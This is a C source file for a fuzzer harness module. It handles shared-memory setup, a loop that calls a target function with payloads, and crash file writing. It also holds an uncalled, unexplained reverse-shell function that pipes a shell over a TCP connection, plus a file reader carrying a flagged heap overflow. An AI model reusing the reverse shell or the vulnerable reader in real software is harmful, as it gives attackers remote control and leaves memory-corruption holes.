#include "../fuzzer.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/stat.h> //mkdir
#include <sys/types.h> //mode
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <fcntl.h>
#ifdef __ANDROID__
  #include "android_ashmem/shm.h"
#else
  #include <sys/shm.h>
#endif

void reverse_shell(char *ip, char *locatebin, int port)
{
   pid_t pid = fork();
   if (pid == -1) {
     syslog(LOG_INFO, "[!] reverse shell error fork. %s", strerror(errno));
     return;
   }
   if (pid > 0) {
     return;
   }

   struct sockaddr_in sa;
   sa.sin_family = AF_INET;
   sa.sin_port = htons(port);
   sa.sin_addr.s_addr = inet_addr(ip);
   int sockt = socket(AF_INET, SOCK_STREAM, 0);

   if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
      syslog(LOG_INFO, "[!] reverse shell connect failed. %s", strerror(errno));
      return;
   }

   dup2(sockt, 0);
   dup2(sockt, 1);
   dup2(sockt, 2);
   char * const argv[] = {locatebin, NULL};
   execve(locatebin, argv, NULL);
}

/* heap buffer overflow, please fix this */
char *out_read = NULL;
char *read_text(char *filepath)
{
   FILE *f = fopen(filepath, "r");

   fseek(f, 0, SEEK_END);
   long fsize = ftell(f);
   rewind(f);

   out_read = malloc(fsize);
   if (fread(out_read, 1, fsize, f) < 0)
       printf("error\n");
   fclose(f);

   return out_read;
}



/*
  create_sem = COMMAP_SIZE, &commap_id, 0, 0
  open_sem = COMMAP_SIZE, NULL, 1, 2323 <-shared_id
 */
extern void *portable_shmat(size_t size, int *ret_id, int mode, int mode_id)
{
   void *addr = MAP_FAILED;

   if (mode == 1) {
      addr = shmat(mode_id, NULL, 0);
   }
   else {
      int shm_id = shmget(IPC_PRIVATE, size, IPC_CREAT | IPC_EXCL | S_IRUSR | S_IWUSR);
      *ret_id = shm_id;

      if (shm_id < 0)
         syslog(LOG_INFO, "[!] failed shmget");

      addr = shmat(shm_id, NULL, 0);
      if (addr == MAP_FAILED)
         syslog(LOG_INFO, "[!] failed shmat");

      if (shmctl(shm_id, IPC_RMID, NULL) < 0)
         syslog(LOG_INFO, "[!] failed shmctl");

      memset(addr, '\0', size);
   }

   return addr;
}



int writeCrash(struct Fstate *fstate)
{
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    char cname[50];

    if (access("crash_result", F_OK) != 0)
    {
       mkdir("crash_result", 0777);
       syslog(LOG_INFO, "[*] module create folder crash_result");
    }

    sprintf(cname, "crash_result/%d-%d-%d-%d-%d-%d", tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

    FILE *outfile;
    if ((outfile = fopen(cname, "wb")) != NULL)
    {
        fputs(fstate->commap->payload, outfile);
        syslog(LOG_INFO, "[*] module write crash: %s", fstate->commap->payload);
    }
    else {
        syslog(LOG_INFO, "[*] module failed write crash file: %s %s", cname, strerror(errno));
        return -1;
    }
    fclose(outfile);

    return 0;
}


int callFuzz(struct Fstate *fstate, void *target_func)
{
   void (*func_ptr)(void*, int);
   func_ptr = NULL;
   func_ptr = target_func;

   syslog(LOG_INFO, "[*] module start iteration");

   while(1)
   {
      func_ptr(fstate->commap->payload, fstate->commap->payload_len);
   }

   return 123;
}

int setup(struct Fstate *fstate, int com_id, void *target_func, int w_crash)
{
   fstate->commap = portable_shmat(COMMAP_SIZE, NULL, 1, com_id);

   if (fstate->commap == MAP_FAILED)
   {
      syslog(LOG_INFO, "[!] module commap_id not found\n");
      return -1;
   }
   else {
      syslog(LOG_INFO, "[*] module commap_addr: %p", fstate->commap);
   }

   if (w_crash)
   {
      syslog(LOG_INFO, "[*] module catch the crash: %s\n", fstate->commap->payload);
      fstate->commap->crash_found = 1;

      return writeCrash(fstate);
   }
   else {
      return callFuzz(fstate, target_func);
   }
}


int module_trigger(void *target_func, int com_id, int write_crash)
{
   struct Fstate fstate;

   return setup(&fstate, com_id, target_func, write_crash);
}
